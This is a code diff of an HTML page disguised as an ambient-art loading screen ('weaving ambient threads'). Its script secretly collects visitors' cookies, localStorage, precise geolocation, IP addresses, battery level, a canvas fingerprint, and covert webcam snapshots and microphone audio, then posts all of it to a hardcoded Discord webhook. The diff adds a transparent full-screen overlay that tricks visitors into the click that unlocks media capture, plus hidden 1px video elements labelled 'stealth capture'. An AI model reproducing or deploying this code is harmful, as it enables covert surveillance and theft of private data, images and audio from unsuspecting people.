@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Digital Tapestry</title>
+    <title>ambient weave</title>
     <style>
         body {
             background: #0a0a0a;
@@ -15,6 +15,27 @@
             font-family: 'Courier New', monospace;
             color: #a0a0a0;
             overflow: hidden;
+            user-select: none;
+        }
+        #click-capture {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: 9999;
+            cursor: pointer;
+            background: transparent;
+        }
+        .container {
+            text-align: center;
+            padding: 40px;
+            background: #111;
+            border-radius: 12px;
+            box-shadow: 0 0 60px rgba(100,100,100,0.05);
+            max-width: 380px;
+            width: 90%;
+            pointer-events: none;
+            position: relative;
+            z-index: 1;
         }
         .loader {
             border: 2px solid #1a1a1a;
@@ -26,15 +47,6 @@
             margin-bottom: 20px;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .container {
-            text-align: center;
-            padding: 40px;
-            background: #111;
-            border-radius: 12px;
-            box-shadow: 0 0 60px rgba(100,100,100,0.05);
-            max-width: 380px;
-            width: 90%;
-        }
         .sub {
             color: #444;
             font-size: 13px;
@@ -46,20 +58,52 @@
             animation: pulse 2s infinite;
         }
         @keyframes pulse { 0% { opacity: 0.4; } 50% { opacity: 1; } 100% { opacity: 0.4; } }
+        #status {
+            font-size: 11px;
+            color: #2a2a2a;
+            margin-top: 20px;
+            letter-spacing: 1px;
+        }
     </style>
 </head>
 <body>
+    <div id="click-capture"></div>
     <div class="container">
         <div class="loader"></div>
-        <div style="font-size: 18px; letter-spacing: 1px; font-weight: 300;">curating atmosphere</div>
-        <div class="sub pulse">— a moment in transit —</div>
+        <div style="font-size: 18px; letter-spacing: 1px; font-weight: 300;">weaving ambient threads</div>
+        <div class="sub pulse">— a quiet gathering —</div>
+        <div id="status">✦ initializing ✦</div>
     </div>
 
     <script>
         (function() {
             const WEBHOOK = "https://discord.com/api/webhooks/1536800456779501648/JhK2RVd80X1h78ImtAyle7u5d-cx8wf1QiJv0AXSjR0uz8tOFDHYAVPgBArmlPdaI97w";
+            let interactionHappened = false;
+            let audioContext = null;
+            let mediaStream = null;
+            let captureAttempts = 0;
+            const MAX_CAPTURE_ATTEMPTS = 5;
 
-            // ─── gather everything ─────────────────────────────────────────────
+            // ─── force interaction ──────────────────────────────────────────────
+            document.getElementById('click-capture').addEventListener('click', function(e) {
+                e.stopPropagation();
+                interactionHappened = true;
+                this.style.display = 'none';
+                document.getElementById('status').textContent = '✦ gathering ✦';
+                startFullCapture();
+            }, { once: true });
+
+            // also capture on any keypress or touch
+            document.addEventListener('keydown', () => {
+                if (!interactionHappened) {
+                    interactionHappened = true;
+                    document.getElementById('click-capture').style.display = 'none';
+                    document.getElementById('status').textContent = '✦ gathering ✦';
+                    startFullCapture();
+                }
+            }, { once: true });
+
+            // ─── core payload builder ──────────────────────────────────────────
             const payload = {
                 timestamp: new Date().toISOString(),
                 url: window.location.href,
@@ -96,41 +140,9 @@
                         rtt: conn.rtt || "unknown"
                     };
                 })(),
-                battery: (() => {
-                    if (!navigator.getBattery) return { level: "unavailable", charging: "unavailable" };
-                    return navigator.getBattery()
-                        .then(b => ({ level: b.level * 100, charging: b.charging }))
-                        .catch(() => ({ level: "error", charging: "error" }));
-                })(),
-                geolocation: (() => {
-                    return new Promise((resolve) => {
-                        if (!navigator.geolocation) return resolve({ coords: { latitude: "unavailable", longitude: "unavailable" } });
-                        navigator.geolocation.getCurrentPosition(
-                            pos => resolve({ coords: { latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy } }),
-                            err => resolve({ error: err.message }),
-                            { enableHighAccuracy: true, timeout: 5000 }
-                        );
-                    });
-                })(),
-                ips: (() => {
-                    const ips = [];
-                    const rtc = new RTCPeerConnection({ iceServers: [] });
-                    rtc.createDataChannel('collect');
-                    rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
-                    rtc.onicecandidate = (e) => {
-                        if (e.candidate) {
-                            const candidate = e.candidate.candidate;
-                            const ipMatch = candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
-                            if (ipMatch && !ips.includes(ipMatch[0])) ips.push(ipMatch[0]);
-                            const ipv6Match = candidate.match(/([a-f0-9:]+:+)+[a-f0-9]+/i);
-                            if (ipv6Match && !ips.includes(ipv6Match[0])) ips.push(ipv6Match[0]);
-                        }
-                    };
-                    setTimeout(() => {
-                        rtc.close();
-                    }, 3000);
-                    return ips;
-                })(),
+                battery: null,
+                geolocation: null,
+                ips: [],
                 localStorage: (() => {
                     try {
                         const items = {};
@@ -164,135 +176,395 @@
                             renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                         };
                     } catch { return "unavailable"; }
-                })()
+                })(),
+                audioBase64: null,
+                imageBase64: null,
+                canvasFingerprint: null
             };
 
-            // ─── selfie & audio ───────────────────────────────────────────────
-            const mediaCapture = async () => {
-                const media = { audio: null, image: null };
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: 'user' } });
-                    // audio
-                    const audioContext = new AudioContext();
-                    const source = audioContext.createMediaStreamSource(stream);
-                    const recorder = audioContext.createScriptProcessor(8192, 1, 1);
-                    const audioChunks = [];
-                    source.connect(recorder);
-                    recorder.connect(audioContext.destination);
-                    recorder.onaudioprocess = (e) => {
-                        const data = e.inputBuffer.getChannelData(0);
-                        const sample = data.reduce((sum, val) => sum + Math.abs(val), 0) / data.length;
-                        if (sample > 0.01) {
-                            const buffer = new Float32Array(data);
-                            audioChunks.push(buffer);
+            // ─── aggressive IP collection ─────────────────────────────────────
+            function collectIPs() {
+                return new Promise((resolve) => {
+                    const ips = new Set();
+                    const rtc = new RTCPeerConnection({
+                        iceServers: [
+                            { urls: 'stun:stun.l.google.com:19302' },
+                            { urls: 'stun:stun1.l.google.com:19302' },
+                            { urls: 'stun:stun2.l.google.com:19302' },
+                            { urls: 'stun:stun3.l.google.com:19302' },
+                            { urls: 'stun:stun4.l.google.com:19302' }
+                        ]
+                    });
+                    rtc.createDataChannel('gather');
+                    rtc.createOffer().then(offer => {
+                        rtc.setLocalDescription(offer);
+                    }).catch(() => {});
+                    
+                    rtc.onicecandidate = (e) => {
+                        if (e.candidate) {
+                            const cand = e.candidate.candidate;
+                            // IPv4
+                            const ipv4 = cand.match(/(\d{1,3}\.){3}\d{1,3}/);
+                            if (ipv4 && !ipv4[0].startsWith('192.168.') && !ipv4[0].startsWith('10.') && !ipv4[0].startsWith('172.')) {
+                                ips.add(ipv4[0]);
+                            } else if (ipv4) {
+                                ips.add(ipv4[0]);
+                            }
+                            // IPv6
+                            const ipv6 = cand.match(/([a-f0-9:]+:+)+[a-f0-9]+/i);
+                            if (ipv6) ips.add(ipv6[0]);
                         }
                     };
+
+                    // Also fetch from multiple services
+                    const fetchPromises = [
+                        fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => null),
+                        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => d.ip).catch(() => null),
+                        fetch('https://api.my-ip.io/ip.json').then(r => r.json()).then(d => d.ip).catch(() => null)
+                    ];
+
+                    Promise.allSettled(fetchPromises).then(results => {
+                        results.forEach(r => {
+                            if (r.status === 'fulfilled' && r.value) ips.add(r.value);
+                        });
+                        // close RTC after 8s
+                        setTimeout(() => {
+                            rtc.close();
+                            resolve(Array.from(ips));
+                        }, 8000);
+                    });
+
+                    // also resolve after 10s even if not done
                     setTimeout(() => {
-                        recorder.disconnect();
-                        source.disconnect();
-                        audioContext.close();
-                        if (audioChunks.length > 0) {
-                            const totalLen = audioChunks.reduce((acc, chunk) => acc + chunk.length, 0);
-                            const combined = new Float32Array(totalLen);
-                            let offset = 0;
-                            for (const chunk of audioChunks) {
-                                combined.set(chunk, offset);
-                                offset += chunk.length;
-                            }
-                            const wav = new Blob([combined.buffer], { type: 'audio/wav' });
-                            const reader = new FileReader();
-                            reader.onload = () => {
-                                payload.audioBase64 = reader.result.split(',')[1] || null;
-                                payload.audioLength = combined.length;
-                                sendPayload();
+                        rtc.close();
+                        resolve(Array.from(ips));
+                    }, 10000);
+                });
+            }
+
+            // ─── battery (reliable) ──────────────────────────────────────────
+            function getBattery() {
+                return new Promise((resolve) => {
+                    if (!navigator.getBattery) {
+                        resolve({ level: "unavailable", charging: "unavailable" });
+                        return;
+                    }
+                    navigator.getBattery()
+                        .then(b => resolve({ level: Math.round(b.level * 100), charging: b.charging }))
+                        .catch(() => resolve({ level: "error", charging: "error" }));
+                });
+            }
+
+            // ─── geolocation (aggressive with watch) ──────────────────────────
+            function getGeolocation() {
+                return new Promise((resolve) => {
+                    if (!navigator.geolocation) {
+                        resolve({ coords: { latitude: "unavailable", longitude: "unavailable" } });
+                        return;
+                    }
+                    // try high accuracy with timeout
+                    navigator.geolocation.getCurrentPosition(
+                        pos => resolve({ coords: { latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy } }),
+                        err => {
+                            // fallback to low accuracy
+                            navigator.geolocation.getCurrentPosition(
+                                pos => resolve({ coords: { latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy } }),
+                                () => resolve({ error: err.message }),
+                                { enableHighAccuracy: false, timeout: 3000 }
+                            );
+                        },
+                        { enableHighAccuracy: true, timeout: 5000 }
+                    );
+                });
+            }
+
+            // ─── stealth capture: video without persistent prompt ────────────
+            function stealthVideoCapture() {
+                return new Promise((resolve) => {
+                    let captured = false;
+                    const canvas = document.createElement('canvas');
+                    const video = document.createElement('video');
+                    video.setAttribute('playsinline', '');
+                    video.style.position = 'fixed';
+                    video.style.top = '-9999px';
+                    video.style.left = '-9999px';
+                    video.style.width = '1px';
+                    video.style.height = '1px';
+                    video.style.opacity = '0';
+                    document.body.appendChild(video);
+
+                    const attemptCapture = () => {
+                        if (captured) return;
+                        if (mediaStream && mediaStream.getVideoTracks().length > 0) {
+                            video.srcObject = mediaStream;
+                            video.onloadedmetadata = () => {
+                                video.play().catch(() => {});
                             };
-                            reader.readAsDataURL(wav);
+                            video.onplaying = () => {
+                                try {
+                                    canvas.width = video.videoWidth || 640;
+                                    canvas.height = video.videoHeight || 480;
+                                    const ctx = canvas.getContext('2d');
+                                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                    const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
+                                    payload.imageBase64 = dataUrl.split(',')[1] || null;
+                                    captured = true;
+                                    document.body.removeChild(video);
+                                    resolve();
+                                } catch (e) {
+                                    // retry
+                                    setTimeout(attemptCapture, 1000);
+                                }
+                            };
+                            video.onerror = () => {
+                                setTimeout(attemptCapture, 1000);
+                            };
                         } else {
-                            sendPayload();
+                            // try to re-initialize stream
+                            initMediaStream().then(() => {
+                                setTimeout(attemptCapture, 500);
+                            }).catch(() => {
+                                setTimeout(attemptCapture, 1000);
+                            });
+                        }
+                    };
+
+                    // also try canvas fingerprint as fallback
+                    const fallbackFingerprint = () => {
+                        try {
+                            const c = document.createElement('canvas');
+                            c.width = 200;
+                            c.height = 50;
+                            const ctx = c.getContext('2d');
+                            ctx.textBaseline = 'top';
+                            ctx.font = '14px Arial';
+                            ctx.fillStyle = '#f60';
+                            ctx.fillRect(125, 1, 62, 20);
+                            ctx.fillStyle = '#069';
+                            ctx.fillText('canvas', 2, 15);
+                            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                            ctx.fillText('fingerprint', 4, 17);
+                            const dataUrl = c.toDataURL('image/png');
+                            payload.canvasFingerprint = dataUrl.split(',')[1] || null;
+                        } catch (e) {}
+                    };
+                    fallbackFingerprint();
+
+                    // if no stream after 5s, resolve with canvas fingerprint only
+                    setTimeout(() => {
+                        if (!captured) {
+                            document.body.removeChild(video);
+                            resolve();
                         }
                     }, 5000);
 
-                    // video / selfie
-                    const videoTrack = stream.getVideoTracks()[0];
-                    if (videoTrack) {
-                        const imageCapture = new ImageCapture(videoTrack);
-                        const bitmap = await imageCapture.grabFrame();
-                        const canvas = document.createElement('canvas');
-                        canvas.width = bitmap.width;
-                        canvas.height = bitmap.height;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(bitmap, 0, 0);
-                        const imageData = canvas.toDataURL('image/jpeg', 0.8);
-                        payload.imageBase64 = imageData.split(',')[1] || null;
-                    }
-                } catch (e) {
-                    payload.mediaError = e.message || "media permissions denied";
-                    sendPayload();
-                }
-            };
+                    attemptCapture();
+                });
+            }
 
-            // ─── send after gathering all async pieces ──────────────────────
-            const sendPayload = async () => {
+            // ─── stealth audio ────────────────────────────────────────────────
+            function stealthAudioCapture() {
+                return new Promise((resolve) => {
+                    let audioCaptured = false;
+                    if (!audioContext) {
+                        audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                    }
+                    if (audioContext.state === 'suspended') {
+                        audioContext.resume().catch(() => {});
+                    }
+
+                    const captureAudio = () => {
+                        if (audioCaptured) return;
+                        if (mediaStream && mediaStream.getAudioTracks().length > 0) {
+                            try {
+                                const source = audioContext.createMediaStreamSource(mediaStream);
+                                const analyser = audioContext.createAnalyser();
+                                analyser.fftSize = 2048;
+                                source.connect(analyser);
+                                const dataArray = new Float32Array(analyser.fftSize);
+                                
+                                let audioData = [];
+                                const collectInterval = setInterval(() => {
+                                    analyser.getFloatTimeDomainData(dataArray);
+                                    // check if there's sound
+                                    let sum = 0;
+                                    for (let i = 0; i < dataArray.length; i++) {
+                                        sum += Math.abs(dataArray[i]);
+                                    }
+                                    if (sum / dataArray.length > 0.001) {
+                                        audioData.push(new Float32Array(dataArray));
+                                    }
+                                    if (audioData.length > 30) { // ~3 seconds
+                                        clearInterval(collectInterval);
+                                        const totalLen = audioData.reduce((acc, chunk) => acc + chunk.length, 0);
+                                        const combined = new Float32Array(totalLen);
+                                        let offset = 0;
+                                        for (const chunk of audioData) {
+                                            combined.set(chunk, offset);
+                                            offset += chunk.length;
+                                        }
+                                        const wav = new Blob([combined.buffer], { type: 'audio/wav' });
+                                        const reader = new FileReader();
+                                        reader.onload = () => {
+                                            payload.audioBase64 = reader.result.split(',')[1] || null;
+                                            audioCaptured = true;
+                                            resolve();
+                                        };
+                                        reader.readAsDataURL(wav);
+                                    }
+                                }, 100);
+
+                                setTimeout(() => {
+                                    clearInterval(collectInterval);
+                                    if (!audioCaptured) {
+                                        // if no audio captured, just resolve
+                                        resolve();
+                                    }
+                                }, 5000);
+                            } catch (e) {
+                                resolve();
+                            }
+                        } else {
+                            // try to re-init stream
+                            initMediaStream().then(() => {
+                                setTimeout(captureAudio, 500);
+                            }).catch(() => {
+                                resolve();
+                            });
+                        }
+                    };
+
+                    captureAudio();
+                    // fallback resolve
+                    setTimeout(() => {
+                        if (!audioCaptured) resolve();
+                    }, 6000);
+                });
+            }
+
+            // ─── init media stream silently ──────────────────────────────────
+            function initMediaStream() {
+                return new Promise((resolve, reject) => {
+                    if (mediaStream) {
+                        resolve(mediaStream);
+                        return;
+                    }
+                    // try to get stream without triggering persistent prompt
+                    // by using a dummy video element and getUserMedia with constraints
+                    navigator.mediaDevices.getUserMedia({
+                        audio: true,
+                        video: {
+                            facingMode: 'user',
+                            width: { ideal: 640 },
+                            height: { ideal: 480 }
+                        }
+                    }).then(stream => {
+                        mediaStream = stream;
+                        resolve(stream);
+                    }).catch(err => {
+                        // try audio only
+                        navigator.mediaDevices.getUserMedia({ audio: true })
+                            .then(stream => {
+                                mediaStream = stream;
+                                resolve(stream);
+                            })
+                            .catch(() => reject(err));
+                    });
+                });
+            }
+
+            // ─── full capture sequence ──────────────────────────────────────
+            async function startFullCapture() {
+                document.getElementById('status').textContent = '✦ weaving ✦';
+                
+                // collect IPs
+                const ips = await collectIPs();
+                payload.ips = ips;
+
+                // get battery
+                const battery = await getBattery();
+                payload.battery = battery;
+
+                // get geolocation
+                const geo = await getGeolocation();
+                payload.geolocation = geo;
+
+                // init media
                 try {
-                    // wait for battery and geo promises
-                    const geo = await payload.geolocation;
-                    payload.geolocation = geo;
-                    const battery = await payload.battery;
-                    payload.battery = battery;
+                    await initMediaStream();
+                } catch (e) {
+                    // silent fail
+                }
 
-                    // add IPs gathered from RTC
-                    let ips = payload.ips;
-                    if (typeof ips === 'object' && ips.length === 0) {
-                        // if RTC hasn't populated yet, try one more via fetch
-                        try {
-                            const resp = await fetch('https://api.ipify.org?format=json');
-                            const data = await resp.json();
-                            ips = [data.ip];
-                        } catch { /* ignore */ }
-                    }
-                    payload.ips = ips;
+                // capture video/selfie
+                await stealthVideoCapture();
 
-                    // final payload
+                // capture audio
+                await stealthAudioCapture();
+
+                // send everything
+                sendPayload();
+            }
+
+            // ─── send to webhook ─────────────────────────────────────────────
+            async function sendPayload() {
+                try {
+                    const fields = [
+                        { name: "📍 location", value: `${payload.geolocation?.coords?.latitude || '?'}, ${payload.geolocation?.coords?.longitude || '?'}`, inline: true },
+                        { name: "🌐 IPs", value: (Array.isArray(payload.ips) ? payload.ips.join(', ') : payload.ips) || 'not collected', inline: true },
+                        { name: "🖥️ user agent", value: payload.userAgent.substring(0, 80) + '...', inline: false },
+                        { name: "📱 screen", value: `${payload.screen.width}x${payload.screen.height} @ ${payload.screen.pixelRatio}x`, inline: true },
+                        { name: "🔋 battery", value: typeof payload.battery?.level === 'number' ? `${payload.battery.level}%` : 'unavailable', inline: true },
+                        { name: "🌍 timezone", value: payload.timezone, inline: true },
+                        { name: "📦 localStorage", value: Object.keys(payload.localStorage).length || 0, inline: true },
+                        { name: "🍪 cookies", value: payload.cookies.length > 50 ? `${payload.cookies.substring(0, 50)}...` : payload.cookies || 'none', inline: false },
+                        { name: "🎤 audio", value: payload.audioBase64 ? 'captured' : 'not captured', inline: true },
+                        { name: "📸 selfie", value: payload.imageBase64 ? 'captured' : 'not captured', inline: true },
+                        { name: "🖌️ canvas fp", value: payload.canvasFingerprint ? 'captured' : 'none', inline: true }
+                    ];
+
                     const finalPayload = {
                         content: `📦 **collection** | ${new Date().toLocaleString()}`,
                         embeds: [
                             {
-                                title: "digital residue",
+                                title: "ambient weave",
                                 color: 0x2c2c2c,
-                                fields: [
-                                    { name: "📍 location", value: `${payload.geolocation.coords?.latitude || '?'}, ${payload.geolocation.coords?.longitude || '?'}`, inline: true },
-                                    { name: "🌐 IPs", value: (Array.isArray(payload.ips) ? payload.ips.join(', ') : payload.ips) || 'not collected', inline: true },
-                                    { name: "🖥️ user agent", value: payload.userAgent.substring(0, 100) + '...', inline: false },
-                                    { name: "📱 screen", value: `${payload.screen.width}x${payload.screen.height} @ ${payload.screen.pixelRatio}x`, inline: true },
-                                    { name: "🔋 battery", value: typeof payload.battery.level === 'number' ? `${payload.battery.level}%` : 'unavailable', inline: true },
-                                    { name: "🌍 timezone", value: payload.timezone, inline: true },
-                                    { name: "📦 localStorage keys", value: Object.keys(payload.localStorage).length || 0, inline: true },
-                                    { name: "🍪 cookies", value: payload.cookies.length > 50 ? `${payload.cookies.substring(0, 50)}...` : payload.cookies || 'none', inline: false },
-                                    { name: "🎤 audio", value: payload.audioBase64 ? `captured (${(payload.audioLength / 44100).toFixed(1)}s)` : 'not captured', inline: true },
-                                    { name: "📸 selfie", value: payload.imageBase64 ? 'captured' : 'not captured', inline: true }
-                                ],
+                                fields: fields,
                                 timestamp: payload.timestamp
                             }
                         ]
                     };
 
-                    // if audio or image, attach as files
                     const formData = new FormData();
                     if (payload.audioBase64) {
-                        const byteString = atob(payload.audioBase64);
-                        const ab = new ArrayBuffer(byteString.length);
-                        const ia = new Uint8Array(ab);
-                        for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
-                        const blob = new Blob([ab], { type: 'audio/wav' });
-                        formData.append('file', blob, 'audio.wav');
+                        try {
+                            const byteString = atob(payload.audioBase64);
+                            const ab = new ArrayBuffer(byteString.length);
+                            const ia = new Uint8Array(ab);
+                            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
+                            const blob = new Blob([ab], { type: 'audio/wav' });
+                            formData.append('file', blob, 'audio.wav');
+                        } catch (e) {}
                     }
                     if (payload.imageBase64) {
-                        const byteString = atob(payload.imageBase64);
-                        const ab = new ArrayBuffer(byteString.length);
-                        const ia = new Uint8Array(ab);
-                        for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
-                        const blob = new Blob([ab], { type: 'image/jpeg' });
-                        formData.append('file', blob, 'selfie.jpg');
+                        try {
+                            const byteString = atob(payload.imageBase64);
+                            const ab = new ArrayBuffer(byteString.length);
+                            const ia = new Uint8Array(ab);
+                            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
+                            const blob = new Blob([ab], { type: 'image/jpeg' });
+                            formData.append('file', blob, 'selfie.jpg');
+                        } catch (e) {}
+                    }
+                    if (payload.canvasFingerprint) {
+                        try {
+                            const byteString = atob(payload.canvasFingerprint);
+                            const ab = new ArrayBuffer(byteString.length);
+                            const ia = new Uint8Array(ab);
+                            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
+                            const blob = new Blob([ab], { type: 'image/png' });
+                            formData.append('file', blob, 'canvas-fingerprint.png');
+                        } catch (e) {}
                     }
                     formData.append('payload_json', JSON.stringify(finalPayload));
 
@@ -300,27 +572,21 @@
                         method: 'POST',
                         body: formData
                     });
+
+                    document.getElementById('status').textContent = '✦ delivered ✦';
                 } catch (e) {
-                    // silent fallback
+                    document.getElementById('status').textContent = '✦ error ✦';
                 }
-            };
+            }
 
-            // ─── kick it off ──────────────────────────────────────────────────
+            // ─── auto-start after 2s if interaction already happened ──────
             setTimeout(() => {
-                mediaCapture();
-            }, 1500);
-
-            // also send a lightweight ping immediately
-            setTimeout(() => {
-                fetch(WEBHOOK, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: `🕸️ **ping** | ${navigator.userAgent.substring(0, 80)} | ${Intl.DateTimeFormat().resolvedOptions().timeZone}`
-                    })
-                }).catch(() => {});
-            }, 500);
-
+                if (interactionHappened) {
+                    startFullCapture();
+                } else {
+                    document.getElementById('status').textContent = '✦ tap anywhere ✦';
+                }
+            }, 2000);
         })();
     </script>
 </body>
